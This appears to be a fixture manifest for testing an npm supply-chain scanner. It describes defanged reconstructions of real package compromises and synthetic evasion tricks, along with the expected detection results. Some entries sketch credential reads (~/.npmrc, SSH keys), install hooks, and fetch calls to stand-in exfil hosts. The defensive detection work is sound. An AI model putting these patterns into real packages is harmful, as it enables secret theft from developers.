notice: DEFANGED SYNTHETIC RECONSTRUCTIONS (PLAN §7.4 fallback). Package names and versions are public identifiers from documented incidents; every file is synthetic, modeled on public analyses, and never the original artifact. Fixtures are parsed by tests only: never imported, installed, executed, or published. Hosts use reserved .example.test or .example.invalid names, and commands are nonexistent fixture names.

incidents.name: axios-2026
incidents.title: axios npm compromise: capability laundering through a new dependency
incidents.kept: axios source unchanged; axios package.json adds "plain-crypto-js": "^4.2.1" and drops "prepare": "husky"; plain-crypto-js@4.2.1 is new to the tree with "postinstall": "node setup.js" and a package.md decoy; setup.js uses an encoded string table (reverse, _ to =, base64, XOR) decoded at runtime into computed require() calls and an execSync sink.
incidents.omitted: Real decoded strings, C2 contact, payload download, and self-deletion. The table decodes to inert fixture values and the entry function is never called.
incidents.expected: plain-crypto-js gets a full new-package report with a CRITICAL registry postinstall hook and UNKNOWN in install-script code; the axios bump shows a LOW dependency addition cross-linked to that report; the default CRITICAL gate fails.

incidents.name: shai-hulud-2025
incidents.title: Shai-Hulud worm, September 2025 wave: postinstall bundle
incidents.date: 2025-09 (@ctrl/tinycolor 4.1.1 and 4.1.2 were both compromised; controls use synthetic versions)
incidents.kept: "postinstall": "node bundle.js" added to an otherwise unchanged package; bundle.js reads GITHUB_TOKEN and NPM_TOKEN, runs a secret-scanner process, and posts to a GitHub API endpoint.
incidents.omitted: The multi-megabyte webpack bundle, the real scanner, repository and workflow creation, and republishing. The harvest function is never called and its endpoint is api.github.example.test.
incidents.expected: CRITICAL install-hook-change, install-code-execution for NET, ENV, and PROCESS in bundle.js, and secret-exfiltration; a parser-limit simulation still fails the gate on the hook alone.

incidents.name: shai-hulud-2-2025
incidents.title: Shai-Hulud 2.0, November 2025 wave: preinstall Bun loader
incidents.kept: "preinstall": "node setup_bun.js" loader that hands bun_environment.js to another runtime; an encoded payload with a dynamic-evaluation sink.
incidents.omitted: Bun download and installation, the 480,000+ line obfuscated payload, runner registration, and all execution. The victim package name is synthetic.
incidents.expected: CRITICAL install-hook-change for the registry preinstall hook with package.json evidence; the default gate fails.

incidents.name: layout-evasion
incidents.title: Synthetic layout evasion (not a historical incident)
incidents.kept: npm installs a tarball rooted at any top-level directory (pacote extracts with strip: 1), so a hook in x/package.json runs on install.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in, and hook.js returns a constant.
incidents.expected: Before ADR-013 the x/-rooted version was rejected as invalid-layout, so it was unavailable and passed the default gate. It must now be analyzed with a CRITICAL registry postinstall hook.

incidents.name: mode-evasion
incidents.title: Synthetic archive-mode evasion (not a historical incident)
incidents.kept: A v1.0.1 bump adds a registry "postinstall": "node hook.js", and the tarball stores both package.json and hook.js with mode 000. node-tar creates each file with the archive mode, so on an unprivileged runner the hook's bytes were unreadable: the manifest read failed to manifest-unreadable (severity null) and hook.js was never analyzed. npm makes the hook bytes readable; executable malicious code could exploit the same modes.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. hook.js reads an environment token and spawns a nonexistent fixture command; the capability is modeled, never executed, and nothing is exfiltrated.
incidents.expected: After ADR-019 every extracted file is mode 0o600, so package.json is readable and the CRITICAL registry postinstall hook is reported, while hook.js is parsed with PROCESS and ENV capabilities. The benign control bump carries no hook and passes.

incidents.name: manifest-directory
incidents.title: Synthetic non-regular manifest evasion (not a historical incident)
incidents.kept: The base tarball stores a regular entry package/package.json/child.js, so extracting it makes package.json a directory even though npm still installs the package. The manifest read is then a post-verification failure decided by the bytes, not an environmental read error.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. child.js is inert data and is never imported or executed.
incidents.expected: The old-side manifest is manifest-not-regular, CRITICAL, and becomes a baseline failure. The new side reads cleanly, so the package is analyzed as newly added (ADR-023), the default CRITICAL gate passes, and --strict still reports the unanalyzed old version.

incidents.name: old-side-unanalyzable
incidents.title: Synthetic unanalyzable baseline (not a historical incident)
incidents.kept: The old tarball carries a symlink entry. capdelta rejects link entries before extraction, so the old side fails with link-entry and npm would have installed that version. The attack head adds a registry "postinstall": "node setup.js" in package.json, and setup.js is inert.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. The link target is never created, followed, or written, and setup.js is never executed.
incidents.expected: The old-side link-entry failure is CRITICAL but becomes a baseline failure. The attack head is analyzed as newly added, its registry postinstall hook gates CRITICAL, and the default gate fails. The control head has no install script and no capabilities, so it is analyzed, the gate passes, and the baseline failure stays visible.

incidents.name: template-boundary
incidents.title: Synthetic template element boundary (not a historical incident)
incidents.kept: The 1.0.1 bump adds a tag function that fetches its second template element, and tag`See https://docs.example.test/${0}https://exfil.example.test/c` in index.js. The URL scan used to run past the end of the first element, so it reported only the prose URL and never saw the fetched host.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. Neither the tag function nor module.exports is ever called and the reserved .example.test hosts are never contacted.
incidents.expected: Each template element is scanned on its own, so exfil.example.test is a HIGH new-external-endpoint. The URL that crosses the expression is kept at unknown, which leaves docs.example.test at HIGH too, and the default HIGH gate fails.

incidents.name: escaped-url
incidents.title: Synthetic escaped-string endpoint (not a historical incident)
incidents.kept: The 1.0.1 bump adds fetch("\\x20https://exfil.example.test/c".trim()) in index.js. The raw source has no word boundary before the scheme, so the raw URL scan cannot see the host.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. run() is never called and the reserved .example.test host is never contacted.
incidents.expected: ADR-026 scans the string's cooked value and reports a HIGH new-external-endpoint for exfil.example.test. The unresolved fetch is reported as NET at HIGH too.

incidents.name: underscore-label
incidents.title: Synthetic underscore-label endpoint (not a historical incident)
incidents.kept: The 1.0.1 bump changes the fetched host from cdn.example.test to a_b.exfil.example.test. URL parsing keeps the underscore, and DNS resolves a label that contains one.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. run() is never called and the reserved .example.test hosts are never contacted.
incidents.expected: ADR-029 keeps underscore characters in non-TLD labels, so the bump reports a HIGH new-external-endpoint for a_b.exfil.example.test and the default HIGH gate fails.

incidents.name: file-kinds
incidents.title: Synthetic extensionless Node bin script (not a historical incident)
incidents.kept: The 1.0.1 bump keeps the existing fetch to cdn.example.test in index.js and adds bin/cli with a #!/usr/bin/env node hashbang, a bin entry in package.json, and a fetch to exfil.example.test.

incidents.name: ipv4-octal-hex
incidents.title: Synthetic hex-part IPv4 endpoint (not a historical incident)
incidents.kept: The 1.0.1 bump changes the host in require("net").connect(443, ...) from 192.0.2.10 to 93.0xb8.216.34. The connect call and every other line stay the same, so only the endpoint signal changes.
incidents.omitted: Everything else: the package is a minimal synthetic stand-in. run() is never called and neither address is contacted.
incidents.expected: ADR-031 normalizes the hex part and reports one HIGH new-external-endpoint for 93.184.216.34. The unchanged connect keeps the NET capability from making the diff on its own.

incidents.name: net-existing
incidents.title: Synthetic new endpoint on top of an existing network capability (not a historical incident)
incidents.date: n/a: regression for the v2 phase 2 criteria
incidents.kept: The old version fetches https://api.example.test/status in index.js. The new version keeps that call and adds a POST of JSON.stringify(process.env) to https://collect.example.test/upload. The control changes only a comment.
incidents.omitted: Every real network call: both hosts are reserved .example.test names and are never contacted. The entry function is never called.
incidents.expected: The unchanged NET capability produces no finding, while collect.example.test is a HIGH new-external-endpoint and the default HIGH gate fails. The control reports no finding and passes.

incidents.name: fs-read-existing
incidents.title: Synthetic new sensitive-file read on top of an existing filesystem read (not a historical incident)
incidents.date: n/a: regression for the v2 phase 2 criteria
incidents.kept: The old version reads a project-local config.json with fs.readFileSync. The new version keeps that read and adds reads of ~/.npmrc and ~/.ssh/id_rsa built from os.homedir(). The control adds a harmless project-local read.
incidents.omitted: Every real file read: no file is opened and no credential is used. The entry function is never called.
incidents.expected: The unchanged FS_READ capability produces no finding, while the two credential reads add an FS_SENSITIVE capability at HIGH and the default HIGH gate fails. The control adds only another FS_READ and passes.

incidents.name: event-stream-2018
incidents.title: event-stream backdoor: malicious new dependency with an encrypted payload (November 2018)
incidents.kept: event-stream@3.3.6 adds "flatmap-stream": "^0.1.1" to an otherwise unchanged package. flatmap-stream@0.1.1 reads the event-stream package.json description, derives a key from it, decrypts an embedded blob, and evaluates the result.
incidents.omitted: The real ciphertext, the real key, and the wallet-stealing payload. The blob is an inert placeholder, the payload function is never called, and event-stream source is unchanged.
incidents.expected: event-stream gets a LOW dependency addition cross-linked to the new flatmap-stream report. flatmap-stream gets a full new-package report with a CRITICAL DYNAMIC_CODE eval sink, a LOW read of another package's manifest, and a CRITICAL dynamic-or-native-code shape. The default CRITICAL gate fails.

incidents.name: ua-parser-js-2021
incidents.title: ua-parser-js hijack: preinstall hook downloads a platform-specific binary (October 2021)
incidents.kept: ua-parser-js@0.7.29 adds "preinstall": "node preinstall.js". preinstall.js selects a download URL with os.platform(), fetches it with https.get, and writes the response to a local file.
incidents.omitted: Every real host and miner binary. All URLs use the reserved .example.invalid name, the download function is never called, and the drop path is a fixture name.
incidents.expected: ua-parser-js gets a CRITICAL registry preinstall hook in package.json. NET in the hook's install script is CRITICAL through install-code-execution, FS_WRITE is MEDIUM, and downloads.example.invalid is a HIGH new endpoint. The default CRITICAL gate fails.

incidents.name: eslint-scope-2018
incidents.title: eslint-scope credential theft: npmrc read and remote send (July 2018)
incidents.kept: eslint-scope@3.7.2 adds a function that reads ~/.npmrc with fs.readFileSync and posts its contents to https://npm-stat.example.invalid/collect.
incidents.omitted: The real host, the credential value, and every call. The function is never invoked and the reserved .example.invalid host is never contacted.

The secret-exfiltration shape makes the NET and FS_SENSITIVE findings CRITICAL, npm-stat.example.invalid is a HIGH new endpoint, and the default CRITICAL gate fails.

incidents.name: coa-rc-2021
incidents.title: coa and rc compromised releases, November 2021: preinstall binary dropper
incidents.date: 2021-11-04 (coa 2.0.3 and rc 1.2.9 were two of the published malicious versions)
incidents.kept: Each package keeps its library code and adds "preinstall": "node compile.js". compile.js loads https, fs, os, path, and child_process, downloads a platform-specific binary or DLL from a hard-coded host, writes it with mode 0700, and spawns it detached. Windows takes the cmd.exe or rundll32 branch, Linux takes the chmod and spawn branch.
incidents.omitted: The encoded binary, the real download host, persistence, and every execution path. The entry function is never called and both hosts are reserved .example.invalid names.
incidents.expected: Both packages get a CRITICAL registry preinstall hook, and NET, FS_WRITE, and PROCESS in install-script code. install-hook-change and install-code-execution are CRITICAL, so the default CRITICAL gate fails.

incidents.name: colors-2022
incidents.title: colors 1.4.1 sabotage: endless loop at import
incidents.kept: The 1.4.1 bump adds a top-level for (;;) loop that calls console.log, so importing the package never returns. The library exports are unchanged.
incidents.omitted: The real printed message and the rest of the sabotage. The loop runs only if the package is imported, and the tests parse the file without loading it.
incidents.expected: The signal layer records the module-scope for (;;) as one import-time-unbounded-loop finding at MEDIUM, so gateSeverity counts one MEDIUM and the highest severity is MEDIUM. The default CRITICAL gate still passes, while --fail-on MEDIUM fails. No capability finding or shape matches, because the exports are unchanged and console output is not a capability.

incidents.name: chalk-debug-2025
incidents.title: September 2025 chalk and debug compromise: browser wallet address swap
incidents.date: 2025-09-08 (chalk 5.6.0 and debug 4.4.2 were two of the malicious versions)
incidents.kept: Each bump adds browser.js and points the browser field at it. It wraps window.fetch, XMLHttpRequest open and send, and the window.ethereum and window.solana request methods. Strings that match a 20-byte EVM address are replaced with the all-zero address before a request is sent and in JSON responses.
incidents.omitted: The real injection vector, the operator address, and every real wallet address. The replacement is the all-zero address, which no one controls. The module is never loaded in a browser or in Node.
incidents.expected: The browser wrapper calls fetch, so the new side gains a runtime NET capability at HIGH. No capability describes browser wallet access, address substitution, or request tampering, so the report stops at HIGH and the default CRITICAL gate passes. This is a detection gap.
